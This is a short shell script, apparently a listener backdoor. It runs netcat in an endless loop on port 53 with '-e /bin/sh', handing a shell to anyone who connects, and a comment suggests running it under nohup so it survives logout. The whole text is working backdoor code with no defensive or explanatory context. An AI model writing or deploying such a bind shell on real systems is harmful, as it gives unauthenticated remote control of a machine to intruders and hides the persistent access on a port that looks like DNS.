while [1]; do echo "commence"; nc -l -p 53 -e /bin/sh; done

#run nohup (ignore logout signal)
#nohup ./listener.sh

